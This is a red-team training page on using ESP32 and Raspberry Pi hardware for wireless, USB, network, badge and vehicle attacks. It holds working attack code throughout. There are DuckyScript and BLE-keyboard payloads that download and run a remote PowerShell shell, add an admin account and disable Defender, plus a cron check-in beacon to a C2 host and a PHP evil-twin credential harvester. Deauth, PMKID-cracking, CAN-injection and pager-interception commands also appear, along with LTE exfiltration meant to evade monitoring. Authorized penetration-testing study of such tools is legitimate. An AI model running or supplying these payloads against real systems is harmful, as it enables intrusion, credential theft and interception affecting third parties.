---
layout: training-page
title: "ESP32 & Raspberry Pi Offensive Platforms — Red Team Academy"
module: "Wireless Attacks"
tags:
  - esp32
  - raspberry-pi
  - marauder
  - ghost-esp
  - p4wnp1
  - pwnagotchi
  - dropbox
  - hid-injection
  - evil-twin
  - hardware-hacking
page_key: "wireless-esp32-rpi"
render_with_liquid: false
---

# ESP32 & Raspberry Pi Offensive Platforms

ESP32 microcontrollers and Raspberry Pi single-board computers are two of the most widely used platforms for purpose-built offensive hardware. ESP32 excels at wireless attacks and USB HID injection in a tiny, cheap package. The Raspberry Pi runs a full Linux stack — enabling network implants, HID attacks, autonomous handshake capture, evil twin APs, and GPIO-based hardware hacking. Both are open, well-documented, and trivially deployable inside corporate environments.

---

## ESP32 — Wi-Fi Attacks

### ESP32 Marauder

The primary ESP32 offensive firmware. Supports dedicated Marauder PCBs (v4–v7), M5Cardputer, M5Stack CYD boards, generic ESP32-WROOM-32, and the Flipper Zero Wi-Fi Dev Board. Controlled via USB serial (115200 baud) or on-device TFT display.

```bash
# Flash generic ESP32-WROOM-32 via web flasher
# Navigate to: esp.huhn.me → load Marauder .bin → connect ESP32 USB → flash

# Or via esptool
pip install esptool
esptool.py --port /dev/ttyUSB0 --baud 921600 write_flash \
  0x0000 bootloader.bin \
  0x8000 partitions.bin \
  0xe000 boot_app0.bin \
  0x10000 esp32_marauder_v1.1.0_20240101_generic.bin

# Connect serial terminal
screen /dev/ttyUSB0 115200
# or
minicom -D /dev/ttyUSB0 -b 115200
```

```
# Core command reference

scanap                    — scan for nearby access points
scansta                   — scan for associated client stations
list -a                   — list scanned APs
list -s                   — list scanned stations
select -a 0               — select AP by index

# Deauthentication flood
attack -d                 — deauth all clients from selected AP
# Note: ineffective against 802.11w/PMF clients (Wi-Fi 6 mandatory)

# Beacon spam
attack -b                 — flood airspace with fake SSIDs
# Confuses Wi-Fi surveys; useful during physical engagement as distraction

# PMKID capture (no client required — works against AP directly)
sniffpmkid                — inject fake EAPOL Association Request; AP responds with PMKID
# PMKID saved as pcap to SD card
# Transfer to PC → convert with hcxtools → crack with hashcat -m 22000

# 4-way EAPOL handshake capture
sniffeapol                — capture handshakes triggered by deauth
sniffbeacon               — log all beacons to pcap
sniffraw                  — capture raw 802.11 frames

# Probe request sniffing
# Reveals device SSID history (preferred networks)
sniffprobe                — log probe requests to pcap

# Evil portal (rogue AP + captive portal)
evilportal -c start -w    — spawn AP + serve portal; -w enables deauth of real AP
# Customize portal: /MARAUDER/portals/index.html on SD card
# Harvested credentials logged to /MARAUDER/logs/

stopscan                  — stop all active attacks

# Wardriving with GPS (GPS module on serial2)
wardrive                  — log APs to Wigle-format CSV on SD card

# CSA attack (Channel Switch Announcement) — v1.11.0+
# Forces 802.11h-compliant clients to switch channels; evicts clients from AP
attack -c                 — send CSA frames to selected AP
```

```bash
# Post-capture: crack PMKID
# Convert pcap to hcxdumptool format
hcxpcapngtool -o pmkid.hc22000 capture.pcap
# Crack
hashcat -m 22000 pmkid.hc22000 /usr/share/wordlists/rockyou.txt
hashcat -m 22000 pmkid.hc22000 -a 3 ?d?d?d?d?d?d?d?d  # 8-digit PIN mask
```

### Ghost ESP

ESP-IDF-based (not Arduino) firmware with a web terminal UI. Supports ESP32-WROOM, C3, C6, S3. Active revival maintained at the GhostESP-Revival organization after the original was archived.

```bash
# Flash via web UI at docs.ghostesp.net
# Or esptool with Ghost_ESP .bin

# Connect: device spawns AP "GhostNet" → connect → open 192.168.4.1
# Or serial at 115200 baud
```

```
# Wi-Fi commands
scanap [30|-live|-stop]   — scan APs (30 sec, live, or stop)
listenprobes [6|stop]     — sniff probe requests on channel 6
sweep [-w 30 -b 10]       — full sweep: 30s wifi + 10s BLE, save CSV to SD
attack -d <target>        — deauth attack
attack -e <target>        — EAPOL logoff attack
attack -s <target>        — SAE flood (WPA3, requires C5/C6 + target PSK)
beaconspam -r             — beacon spam with rickroll SSID list
beaconspam -l             — beacon spam from custom ssids.txt on SD
karma start [SSID]        — KARMA/MANA rogue AP; responds to any probe
dhcpstarve <target>       — DHCP starvation attack
evilportal -c start       — launch evil portal
capture -probe            — capture probe requests to pcap

# BLE attacks (not available on ESP32-S2 — no BLE hardware)
blespam -apple            — fake Apple device advertisements (AirPods, AirTags, etc.)
blespam -random           — cycle Apple, Microsoft, Samsung, Google spam
spoofairtag               — replicate scanned AirTag advertisement payload exactly
aerialspoof 1 37.7 -122.4 50  — spoof drone RemoteID broadcast via BLE
blescan -f                — BLE scan with skimmer detection heuristics
blescan -a                — raw BLE advertising capture
blewardriving -s          — BLE beacon logging with GPS metadata
```

### ESP8266 Deauther (Classic)

The original 802.11 deauth tool — simpler than Marauder, 2.4 GHz only, no BLE, no PMKID. Flash via `esptool.spacehuhn.com`.

```bash
# Serial (115200) or web UI at 192.168.4.1 (password: deauther)

scan all -t 10            — scan APs and clients for 10 seconds
attack deauth             — deauth all clients from all selected APs
attack deauthall          — deauth every AP and every client seen
attack beacon             — beacon flood
add ssid "CorpWifi" -wpa2 — add fake SSID to beacon spam list
startap -s "Free_WiFi" -ch 6  — spawn soft AP
```

---

## ESP32 — USB HID Injection

### WiFiDuck / UltraWiFiDuck

WiFiDuck: ATmega32u4 (USB HID) + ESP8266 (Wi-Fi web UI). UltraWiFiDuck modernizes this with ESP32-S2/S3 native USB (no ATmega needed) and adds Bluetooth HID on ESP32-S3.

```bash
# UltraWiFiDuck flash (ESP32-S3 recommended)
# Web flasher: emilespecialproducts.github.io/UltraWiFiDuck/upload.html

# Connect to "wifiduck" SSID (password: wifiduck)
# Open: 192.168.4.1 → write/run DuckyScript from browser
```

```
# DuckyScript payload (run from web UI or SD card)
REM Exfil via PowerShell — download and exec in memory
DEFAULTDELAY 150
GUI r
DELAY 500
STRING powershell -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/shell.ps1')"
ENTER

REM Add local admin
DELAY 200
STRING net user hacker P@ssw0rd123 /add && net localgroup administrators hacker /add
ENTER

REM Disable Windows Defender real-time protection
STRING Set-MpPreference -DisableRealtimeMonitoring $true
ENTER
```

**ESP32 variant selection for HID:**

| Variant | USB HID | BLE HID | Wi-Fi | Notes |
|---|---|---|---|---|
| ESP32-S2 | Native (TinyUSB) | No | 2.4 GHz | WiFiDuck / Marauder DevBoard |
| ESP32-S3 | Native (TinyUSB) | Yes | 2.4 GHz | Best all-round for HID + BLE + Wi-Fi |
| ESP32-C3 | No | Yes | 2.4 GHz | BLE spam only |
| ESP32 (WROOM-32) | No | Classic + BLE | 2.4 GHz | Marauder / Ghost ESP (no USB HID) |
| ESP32-C5/C6 | No | BLE | 2.4 + 5 GHz | Ghost ESP SAE flood; 5 GHz deauth |

---

## Raspberry Pi — USB Implant (P4wnP1 A.L.O.A.)

P4wnP1 A.L.O.A. ("A Little Offensive Appliance") turns a Pi Zero W or Pi Zero 2W into a multi-function USB attack platform running Kali Linux. The Pi presents itself to a target computer as a USB Ethernet adapter, keyboard, mouse, mass storage, or any combination simultaneously.

```bash
# Install
# Download image from github.com/mame82/P4wnP1_aloa/releases
# Flash to microSD with Raspberry Pi Imager or dd
dd if=P4wnP1_aloa_latest.img of=/dev/sdX bs=4M status=progress

# Access (two methods):
# 1. USB Ethernet (plug Pi into target, RNDIS on Windows / CDC-ECM on Linux/macOS)
#    Pi IP: 172.24.0.1  →  SSH: ssh pi@172.24.0.1  (password: toor)
# 2. Wi-Fi AP: SSID "MaMe82-P4wnP1", password "MaMe82-P4wnP1"
#    Web UI: http://172.24.0.1:8000

# CLI from attacker machine (after SSH in):
P4wnP1_cli --help
```

```bash
# Configure USB gadget (simultaneous: HID + RNDIS + mass storage)
P4wnP1_cli usb set --keyboard --mouse --rndis --cd-rom

# HID keystroke injection
P4wnP1_cli hid run -c "
  delay(500);
  press('GUI R');
  delay(500);
  type('powershell -w hidden\n');
  delay(1000);
  type('IEX(IWR http://10.0.0.1/shell.ps1)\n');
"

# Or run a HIDScript file
P4wnP1_cli hid run -n payloads/win10_credentials.js

# Wi-Fi as access point
P4wnP1_cli wifi ap -s RedTeam -p LetMeIn123 --channel 11

# Wi-Fi KARMA attack (responds to any probe with matching SSID)
# Requires Nexmon-patched firmware (included in P4wnP1 image)
P4wnP1_cli wifi ap --karma

# Deploy a saved template (combines USB + WiFi + payload in one action)
P4wnP1_cli template deploy -n full_attack
```

**P4wnP1 built-in attack templates:**

```
Win10 LockPicker:
  USB presents RNDIS (spoofed as high-speed 20 GB/s adapter to win routing)
  Runs Responder → captures NetNTLMv2 hash from locked Windows machine
  Attempts JtR crack → types plaintext password to unlock screen

HID Covert Channel (air-gapped exfil):
  No network adapter visible — communicates solely via HID input/output reports
  NUMLOCK/CAPSLOCK state encodes data channel over USB HID
  Pi relays the shell to attacker over Wi-Fi
  Bypasses USB device control policies that block storage + network adapters

Sticky Keys Backdoor:
  HID injects: copies cmd.exe → replaces sethc.exe (Sticky Keys)
  After reboot: hold SHIFT five times at lock screen → SYSTEM shell
```

---

## Raspberry Pi — Network Dropbox / Implant

A Pi (typically Pi 4 or Pi Zero 2W + USB Ethernet adapter) dropped on the internal network, establishes an outbound-only encrypted tunnel to the attacker's C2 server. Bypasses perimeter controls since traffic originates internally on a trusted MAC.

```bash
# Kali on Pi — base image
# Download: kali.org/get-kali/#kali-arm → Raspberry Pi ARM64
# Flash: dd if=kali-linux-2024.x-raspberry-pi-arm64.img of=/dev/sdX bs=4M

# WireGuard tunnel (outbound only — no inbound firewall rules needed)
apt install wireguard

# /etc/wireguard/wg0.conf
[Interface]
Address = 10.2.0.2/24
PrivateKey = <pi_private_key>
DNS = 1.1.1.1

[Peer]
PublicKey = <attacker_server_pub_key>
Endpoint = <attacker_server_ip>:51820
AllowedIPs = 0.0.0.0/0
PersistentKeepalive = 25   # keep-alive through NAT/stateful firewalls

systemctl enable wg-quick@wg0
systemctl start wg-quick@wg0

# Check-in beacon — lets you know the implant is live
echo "*/5 * * * * root curl -s http://<c2>/beacon?h=$(hostname)&ip=$(hostname -I)" \
  >> /etc/crontab
```

```bash
# ZeroTier alternative (mesh P2P — no port forwarding on C2 required)
curl -s https://install.zerotier.com | bash
zerotier-cli join <network_id>
# Approve device in ZeroTier Central → Pi gets mesh IP
# Access from any ZeroTier-joined host without VPS intermediary

# Transparent bridge (inline between wall jack and workstation)
# Pi intercepts all traffic from the plugged-in device
apt install bridge-utils
brctl addbr br0
brctl addif br0 eth0    # corporate wall jack
brctl addif br0 eth1    # workstation (USB ethernet adapter)
ip link set br0 up
# Pi is now invisible — traffic flows through while being captured by tcpdump
tcpdump -i br0 -w /tmp/capture.pcap

# MAC spoofing for 802.1X / NAC bypass
# Clone a legitimately authenticated device's MAC before connecting
ip link set eth0 down
ip link set eth0 address AA:BB:CC:DD:EE:FF   # cloned MAC
ip link set eth0 up

# Persist MAC spoof across reboots (/etc/systemd/network/10-eth0.link)
[Match]
MACAddress=<pi_real_mac>
[Link]
MACAddress=AA:BB:CC:DD:EE:FF
```

```bash
# Run offensive toolkit over tunnel once connected
# Responder (LLMNR/NBT-NS poisoning)
responder -I wg0 -wdF

# Bloodhound collection
bloodhound-python -u 'user' -p 'pass' -d corp.local -ns 10.0.0.1 -c all

# CrackMapExec over tunnel
cme smb 10.0.0.0/24 --gen-relay-list relay_targets.txt

# Port scan internal network via tunnel
nmap -sT -Pn -p 22,80,443,445,3389 10.0.0.0/24 -oA internal_scan
```

---

## Raspberry Pi — Pwnagotchi (Autonomous Handshake Capture)

Pwnagotchi runs on a Pi Zero W or Pi Zero 2W and autonomously captures WPA2 EAPOL handshakes and PMKID values using bettercap. Walk through a building or leave it in a parking lot — it captures everything without interaction.

```bash
# Flash image (jayofelony maintained fork — supports Pi Zero 2W and Pi 4 64-bit)
# Download from: github.com/jayofelony/pwnagotchi/releases
# Flash with: Raspberry Pi Imager → "Use Custom" → select .img.xz

# Edit config before first boot (on boot partition — readable from any OS)
# File: /boot/config.toml
```

```toml
# /boot/config.toml
main.name = "pwnagotchi"
main.lang = "en"

# Whitelist your own SSIDs / MACs — never attack these
main.whitelist = [
  "HomeNetwork",
  "MyPhone",
  "aa:bb:cc:dd:ee:ff"
]

# Enable all attack modes
personality.deauth = true
personality.associate = true
personality.channels = []        # empty = all channels

# Display (Waveshare 2.13" V2/V4 e-Paper HAT)
ui.display.enabled = true
ui.display.type = "waveshare_2"
ui.display.color = "black"

# Auto-upload to wpa-sec.stanev.org for online cracking
main.plugins.wpa-sec.enabled = true
main.plugins.wpa-sec.api_key = "YOUR_API_KEY"
main.plugins.wpa-sec.api_url = "https://wpa-sec.stanev.org"

# Convert captures to hashcat format on-device
main.plugins.hashie.enabled = true
```

```bash
# Access Pwnagotchi
# Plug into computer via USB data port (not charge-only cable)
# Pi presents as USB Ethernet gadget
# Set computer interface to static IP 10.0.0.1/24
# SSH: ssh pi@10.0.0.2  (default password: raspberry — change it)

# View captured handshakes
ls /root/handshakes/*.pcap

# Convert to hashcat format (if hashie plugin disabled)
apt install hcxtools
hcxpcapngtool -o hashes.hc22000 /root/handshakes/*.pcap
hashcat -m 22000 hashes.hc22000 /usr/share/wordlists/rockyou.txt

# Or use the on-device hcxpcapngtool directly
/root/go/bin/hcxpcapngtool -o /root/handshakes/combined.hc22000 /root/handshakes/*.pcap
```

**Hardware build:**

```
Components:
  Pi Zero 2W              ~$15
  Waveshare 2.13" V2/V4 e-Paper HAT  ~$17  (mandatory for display)
  16 GB microSD (UHS-I A1)  ~$8
  5V/2A USB-C power bank    ~$15
  Short USB cable (data-capable, not charge-only)

Total: ~$55

Note: Pi Zero W (original) also works but is slower than Zero 2W.
Pi Zero 2W handles concurrent deauth + sniff + bettercap much better.
```

---

## Raspberry Pi — Evil Twin AP

A Pi running `hostapd` + `dnsmasq` clones a legitimate SSID and redirects all DNS to a credential-capture portal. Used to harvest corporate Wi-Fi portal credentials, O365/SSO logins, or guest network credentials.

```bash
# Required: two Wi-Fi interfaces
# wlan0 — internal Pi WiFi (runs the evil AP)
# wlan1 — external USB adapter with monitor + injection support (runs deauth)

# Install
apt install hostapd dnsmasq apache2 php iptables

# /etc/hostapd/hostapd.conf
interface=wlan0
driver=nl80211
ssid=TargetCorpWiFi          # clone the legitimate SSID
hw_mode=g
channel=6                    # use same channel as legitimate AP
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
# Optionally: specify BSSID to match legitimate AP MAC
bssid=AA:BB:CC:DD:EE:01      # increment last octet from real BSSID

# /etc/dnsmasq.conf
interface=wlan0
dhcp-range=192.168.50.10,192.168.50.100,255.255.255.0,12h
dhcp-option=3,192.168.50.1   # default gateway = Pi
dhcp-option=6,192.168.50.1   # DNS = Pi
address=/#/192.168.50.1      # resolve ALL domains to Pi (captive portal)
```

```bash
# Start services
systemctl unmask hostapd
systemctl start hostapd
systemctl start dnsmasq

# iptables — redirect HTTP/HTTPS to local portal
iptables -t nat -F
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 \
  -j DNAT --to-destination 192.168.50.1:80
iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 \
  -j DNAT --to-destination 192.168.50.1:80
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
echo 1 > /proc/sys/net/ipv4/ip_forward

# Deauth legitimate AP to force clients to your evil twin
airmon-ng start wlan1
aireplay-ng -0 0 -a <legitimate_BSSID> wlan1mon
```

```php
<?php
// /var/www/html/login.php — capture credentials
if ($_POST) {
    $entry = date('Y-m-d H:i:s') . ',' . $_SERVER['REMOTE_ADDR'] . ',' .
             $_POST['username'] . ',' . $_POST['password'] . "\n";
    file_put_contents('/var/log/portal_creds.txt', $entry, FILE_APPEND);
    // Redirect to a "thank you" or "connecting..." page
    header('Location: /connecting.html');
    exit;
}
?>
```

```bash
# Monitor captured credentials live
tail -f /var/log/portal_creds.txt
```

---

## Raspberry Pi — Hardware Hacking via GPIO

The Pi's GPIO header exposes UART, SPI, I2C, and JTAG interfaces — the debug ports present on nearly every embedded device. Connecting the Pi to a router, industrial controller, or IoT device's exposed debug port often yields a root shell or direct firmware dump.

### UART (Serial Console)

```bash
# Pi GPIO pins (BCM numbering):
# GPIO14 = TX  (Pin 8)
# GPIO15 = RX  (Pin 10)
# GND           (Pin 6)
# LOGIC LEVEL: 3.3V only — use level shifter for 5V targets

# Enable UART on Pi
echo "enable_uart=1" >> /boot/config.txt
# Disable Bluetooth UART conflict (Pi 3/4/5):
echo "dtoverlay=disable-bt" >> /boot/config.txt
reboot

# Connect:
# Pi TX → target device RX
# Pi RX → target device TX
# Pi GND → target GND

# Open serial console (find baud rate: try 115200, 57600, 38400, 9600)
screen /dev/ttyS0 115200
minicom -D /dev/ttyS0 -b 115200

# Common outcomes:
# - U-Boot bootloader prompt: interrupt boot, modify kernel args, boot from USB
# - Linux root shell: direct command execution
# - Restricted shell: escape via LD_PRELOAD, su/sudo, busybox
# - Debug log stream: reveals internal IPs, credentials, error messages
```

### JTAG (Debug Access Port)

```bash
# JTAG lets you halt the CPU, read/write memory, dump firmware, set breakpoints
# Pi BCM GPIO → JTAG mapping (Alt4/Alt5 mode):
# GPIO22 = TRST (Pin 15)
# GPIO24 = TDO  (Pin 18)  [Alt5]
# GPIO25 = TCK  (Pin 22)
# GPIO26 = TDI  (Pin 37)
# GPIO27 = TMS  (Pin 13)

# Enable JTAG GPIO on Pi
echo "gpio=22-27=np" >> /boot/config.txt
echo "enable_jtag_gpio=1" >> /boot/config.txt
reboot

# OpenOCD (on Pi, targeting another device)
apt install openocd
openocd -f interface/raspberrypi-native.cfg -f target/<target_chip>.cfg
# Then connect: telnet localhost 4444
# > reset halt
# > mdw 0x00000000 64    (dump 64 words from address 0x0)
# > dump_image firmware.bin 0x08000000 0x100000  (dump 1MB from flash base)

# JTAGenum — brute-force JTAG pinouts when they're unlabeled
# github.com/cyphunk/JTAGenum
# Load on Pi, run scan to identify TCK/TMS/TDI/TDO among unknown test pads
```

### SPI Flash Dump

```bash
# SPI0 on Pi: MOSI=GPIO10, MISO=GPIO9, SCLK=GPIO11, CE0=GPIO8
# Connect to SPI NOR flash chip (common on router boards, IoT devices)
# Use SOIC-8 clip or probe directly to chip pins
# Logic level: 3.3V (level shift for 1.8V flash chips)

apt install flashrom

# Identify chip and dump
flashrom -p linux_spi:dev=/dev/spidev0.0,spispeed=4000 --flash-name
flashrom -p linux_spi:dev=/dev/spidev0.0,spispeed=4000 -r firmware.bin

# Analyze firmware
binwalk -e firmware.bin              # extract filesystem
binwalk --dd='.*' firmware.bin       # extract everything
strings firmware.bin | grep -i pass  # search for credentials
```

---

## Hardware Selection Guide

### ESP32 Variants

| Variant | Wi-Fi | BLE | USB HID | Best Use |
|---|---|---|---|---|
| ESP32-WROOM-32 | 2.4 GHz | Classic + BLE | No | Marauder, Ghost ESP — most supported |
| ESP32-S2 | 2.4 GHz | No | Native | WiFiDuck, Flipper Dev Board |
| ESP32-S3 | 2.4 GHz | BLE 5.0 | Native | UltraWiFiDuck — best all-round |
| ESP32-C3 | 2.4 GHz | BLE 5.0 | No | BLE spam attacks |
| ESP32-C5 | 2.4 + 5 GHz | BLE 5.0 | No | Marauder 5 GHz deauth (new) |
| ESP32-C6 | 2.4 + 5 GHz | BLE 5.0 | No | Ghost ESP SAE flood |
| ESP8266 | 2.4 GHz | No | No | esp8266_deauther (legacy, simple) |

### Raspberry Pi Variants

| Use Case | Best Model | Reason |
|---|---|---|
| P4wnP1 / USB HID implant | Pi Zero 2W | USB OTG (dwc2), pocketable, low power |
| Pwnagotchi | Pi Zero 2W | Compact, Wi-Fi, USB gadget for management |
| Network dropbox (long-term) | Pi 4 (4GB) | Gigabit Ethernet, USB 3.0, run full toolkit |
| Hardware hacking (GPIO) | Pi 4 or Pi 3B+ | Full GPIO header, OpenOCD performance |
| PiRogue mobile intercept | Pi 4 (4GB min) | 4 GB RAM + 40 GB storage required |
| Pi 5 | Advanced dropbox | Fastest — overkill for most field ops |

**Critical:** Pi Zero W/2W and Pi 4/5 all support USB gadget (OTG) mode. Pi Zero uses Micro-USB data port; Pi 4 uses the USB-C power port. Pi 5 uses USB-C via the RP1 southbridge. OTG mode is what enables P4wnP1 and Pwnagotchi to present USB devices to a host.

---

## ESP32 — Bluetooth Exploitation

### BLE Sniffing & Reconnaissance

```bash
# ESP32 with Ghost ESP or custom firmware for BLE reconnaissance

# Ghost ESP BLE scanning
blescan -a                     # raw BLE advertising capture
blescan -f                     # BLE skimmer detection heuristics

# nRF Sniffer (ESP32 alternative: use nRF52840 dongle with Wireshark)
# ESP32 can capture BLE advertisements but not full connection sniffing
# For full BLE MITM, use the nRF52840 dongle + Wireshark BLE plugin

# ESP32 BLE tracker — passive surveillance
# Tracks BLE MAC addresses over time to identify movement patterns
# Useful for: physical surveillance during engagements
# GitHub: github.com/cyberman54/ESP32-Paxcounter
# Counts Wi-Fi + BLE devices passively (no transmission needed)

# Flash Paxcounter
platformio run --target upload --environment esp32dev
# Web dashboard shows real-time device count + MAC diversity
```

### BLE Spam & Disruption

```
# Ghost ESP BLE spam attacks
blespam -apple               # fake Apple device pop-ups (AirPods, AirTag, etc.)
blespam -samsung              # fake Samsung device advertisements
blespam -microsoft            # fake Microsoft Swift Pair notifications
blespam -google               # fake Google Fast Pair notifications
blespam -random               # cycle through all vendors randomly

# Use cases:
# - Distraction during physical penetration testing
# - Demonstrate BLE notification fatigue to clients
# - Test BLE-based access control resilience
# - Flood area with fake AirTag advertisements

spoofairtag                   # replicate a scanned AirTag's exact BLE payload
aerialspoof 1 37.7 -122.4 50 # spoof drone Remote ID broadcast
```

### ESP32 BLE Keyboard Emulation

```cpp
// ESP32-S3 or ESP32 (classic BLE) can act as a Bluetooth HID keyboard
// No USB connection required — pairs wirelessly to target device

// Use the ESP32-BLE-Keyboard library
// github.com/T-vK/ESP32-BLE-Keyboard

#include <BleKeyboard.h>
BleKeyboard bleKeyboard("Logitech KB", "Logitech", 100);

void setup() {
  bleKeyboard.begin();
}

void loop() {
  if (bleKeyboard.isConnected()) {
    // Wait for pairing, then inject keystrokes wirelessly
    delay(5000);
    bleKeyboard.press(KEY_LEFT_GUI);
    bleKeyboard.press('r');
    bleKeyboard.releaseAll();
    delay(500);
    bleKeyboard.println("powershell -w hidden -ep bypass -c \"IEX(IWR http://10.10.14.5/s.ps1)\"");
    delay(30000); // don't repeat
  }
}

// Attack scenario:
// 1. ESP32-S3 advertises as "Logitech KB" or "Apple Keyboard"
// 2. Target device auto-pairs (if Bluetooth is in discoverable/pairable mode)
// 3. ESP32 injects keystrokes wirelessly — no USB cable needed
// 4. Works against phones, tablets, laptops with BLE enabled

// Limitations:
// - Requires target to accept BLE pairing (notification pops up)
// - Modern OS requires explicit user approval for HID pairing
// - Best paired with social engineering ("try this new keyboard")
```

---

## ESP32 — RFID & Badge Cloning

```bash
# ESP32 + PN532 or RC522 NFC/RFID module = portable badge cloner
# Read 125 kHz (HID ProxCard) and 13.56 MHz (MIFARE, DESFire, iCLASS)

# Wiring (ESP32 + PN532 via SPI):
# ESP32 GPIO18 (SCK)  → PN532 SCK
# ESP32 GPIO19 (MISO) → PN532 MISO
# ESP32 GPIO23 (MOSI) → PN532 MOSI
# ESP32 GPIO5  (SS)   → PN532 SS
# ESP32 3.3V → PN532 VCC
# ESP32 GND  → PN532 GND

# Arduino sketch to read NFC UID
# Use Adafruit_PN532 library
# Reads card UID when presented — logs to serial or SD card

# ESP32 + Wiegand reader (for 125 kHz proximity cards):
# Tap into Wiegand data lines (D0, D1) at a card reader
# ESP32 captures the Wiegand bitstream (26-bit or 34-bit)
# Replay later with a Proxmark3 or custom Wiegand emitter

# Complete badge cloning workflow:
# 1. Position ESP32 + PN532 near a legitimate card reader or in a bag
# 2. Social engineer target: "can I see your badge for a moment?"
# 3. ESP32 reads the card UID and stores it
# 4. Clone to a blank T5577 card using Proxmark3:
#    proxmark3> lf hid clone --id 2004AABBCC
# 5. Use cloned badge to access secured areas
```

---

## ESP32 — CAN Bus & Automotive Attacks

```bash
# ESP32 + MCP2515 CAN transceiver = automotive attack platform
# Read and inject CAN bus frames for vehicle testing

# Wiring (ESP32 + MCP2515):
# ESP32 GPIO5 (CS)    → MCP2515 CS
# ESP32 GPIO23 (MOSI) → MCP2515 SI
# ESP32 GPIO19 (MISO) → MCP2515 SO
# ESP32 GPIO18 (SCK)  → MCP2515 SCK
# ESP32 GPIO4 (INT)   → MCP2515 INT
# ESP32 3.3V → MCP2515 VCC
# ESP32 GND  → MCP2515 GND

# Connect CAN-H and CAN-L to the vehicle's OBD-II port (pins 6 and 14)
# Or tap directly into CAN bus wires behind the dashboard

# Arduino library: github.com/sandeepmistry/arduino-CAN or mcp_can

# Read CAN frames (passive sniffing)
# Monitor all traffic on the bus — identify control frames
# Look for: door locks, ignition, instrument cluster, TPMS

# Inject CAN frames (active attack)
# Replay captured frames to trigger actions:
# - Unlock doors
# - Disable immobilizer
# - Trigger instrument cluster warnings
# - Manipulate speedometer reading

# SavvyCAN (PC software) + ESP32 running GVRET firmware:
# github.com/collin80/SavvyCAN
# ESP32 becomes a Wi-Fi CAN bridge — SavvyCAN connects over the network
# Full CAN bus analysis, filtering, and injection from laptop

# OPSEC: CAN bus has no authentication — any device on the bus can send any frame
# Modern vehicles are adding CAN-FD and gateway ECUs to segment the bus
```

---

## Raspberry Pi — WPA-Enterprise Credential Capture

```bash
# EAPHammer — rogue AP that captures WPA-Enterprise (802.1X) credentials
# Targets PEAP, EAP-TTLS, EAP-TLS enterprise Wi-Fi networks
# github.com/s0lst1c3/eaphammer

# Install on Raspberry Pi (Kali ARM)
git clone https://github.com/s0lst1c3/eaphammer.git
cd eaphammer
./kali-setup

# Generate rogue certificates
./eaphammer --cert-wizard

# Launch rogue AP targeting WPA-Enterprise
./eaphammer -i wlan0 --auth wpa-enterprise --essid "CorpWiFi" \
  --creds --channel 6

# What happens:
# 1. EAPHammer clones the corporate SSID
# 2. Deauths clients from the real AP (requires monitor mode adapter)
# 3. Clients reconnect to the rogue AP
# 4. During EAP negotiation, captures:
#    - MSCHAPv2 challenge/response (crackable with hashcat -m 5500)
#    - Cleartext credentials (if EAP-GTC is negotiated)
#    - Certificate details
# 5. Credentials logged to database

# Crack captured MSCHAPv2 hashes
hashcat -m 5500 captured_hashes.txt /usr/share/wordlists/rockyou.txt

# hostapd-mana (alternative — raw hostapd with MANA patches)
# More manual setup but finer control
# github.com/sensepost/hostapd-mana
```

---

## Raspberry Pi — Covert Exfiltration via LTE

```bash
# Add a USB LTE modem to any Pi implant for independent network access
# Bypasses all corporate network monitoring — traffic goes direct to cellular

# Recommended modems:
# - Quectel EC25 (Mini PCIe or USB dongle) — reliable, well-supported
# - Huawei E3372h — common, plug-and-play on Linux
# - Sierra Wireless EM7455 — enterprise grade
# - ZTE MF833V — cheap, works well

# Setup (Huawei E3372h example)
apt install usb-modeswitch network-manager
# Plug in modem — should auto-detect as wwan0 or usb0

# NetworkManager (recommended)
nmcli connection add type gsm con-name "LTE" ifname "*" apn "internet"
nmcli connection up "LTE"

# Or manual (if NM unavailable)
usb_modeswitch -v 12d1 -p 14fe -M '55534243...'
ip link set wwan0 up
udhcpc -i wwan0

# Verify connectivity
curl -s --interface wwan0 ifconfig.me

# Route offensive traffic through LTE (keep Ethernet for internal access)
# Two interfaces: eth0 (corporate network) + wwan0 (LTE for C2)
ip route add default via <lte_gateway> dev wwan0 table 100
ip rule add fwmark 0x1 table 100
iptables -t mangle -A OUTPUT -p tcp --dport 51820 -j MARK --set-mark 0x1
# WireGuard C2 traffic goes out LTE; everything else stays on corporate network

# Operational advantages:
# - C2 traffic never touches corporate network — invisible to SIEM/IDS
# - Even if the Pi is discovered, C2 infrastructure is separate from target network
# - Data exfiltration goes direct to cellular — no proxy/firewall inspection
# - Pi can operate entirely off LTE if no Ethernet is available

# Power considerations:
# LTE modem draws 500-800mA — ensure power supply can handle it
# Pi 4 + LTE modem needs minimum 3A USB-C supply
# Battery pack: 20,000 mAh = ~12-18 hours runtime with LTE active
```

---

## Raspberry Pi — Signal Intelligence (SDR)

```bash
# RTL-SDR dongle ($25) + Raspberry Pi = portable signals intelligence platform
# Receive: 24 MHz to 1.7 GHz (covers FM radio, ADS-B, pagers, POCSAG, trunked radio)

# Install RTL-SDR tools
apt install rtl-sdr gqrx-sdr gnuradio

# Test dongle
rtl_test -t

# Capture and decode pager traffic (POCSAG)
# Many hospitals, businesses still use unencrypted pagers
apt install multimon-ng
rtl_fm -f 152.480M -s 22050 -g 50 | multimon-ng -t raw -a POCSAG512 -a POCSAG1200 -f alpha -
# Output: decoded pager messages in plaintext
# Content often includes: patient names, codes, internal communications

# ADS-B aircraft tracking (1090 MHz)
apt install dump1090-mutability
dump1090-mutability --interactive --net
# View aircraft positions at http://pi-ip:8080

# Capture radio communications (analog FM)
rtl_fm -f 460.500M -M fm -s 12500 -r 48000 | aplay -r 48000 -f S16_LE

# Trunked radio decoding (P25 digital)
# Use OP25: github.com/boatbod/op25
# Decode public safety (police, fire, EMS) digital radio

# Wi-Fi monitoring (with compatible SDR — not RTL-SDR)
# SDR can capture raw 802.11 frames for analysis

# Operational uses:
# - Listen to security guard radio communications during physical pentest
# - Decode pager messages for intelligence gathering
# - Monitor building management system wireless (BACnet, Zigbee)
# - Track personnel via radio traffic patterns
# - Verify wireless alarm system frequencies before entry

# IMPORTANT: Intercepting radio communications may violate wiretapping laws
# Ensure your engagement authorization covers RF interception
```

---

## Raspberry Pi — Rogue DHCP & DNS for Network Interception

```bash
# Pi as a rogue DHCP server on a corporate network
# Races the legitimate DHCP server to hand out attacker-controlled DNS/gateway
# All victim DNS queries route through the Pi → credential capture, MITM

# Install
apt install isc-dhcp-server dnsmasq mitmproxy

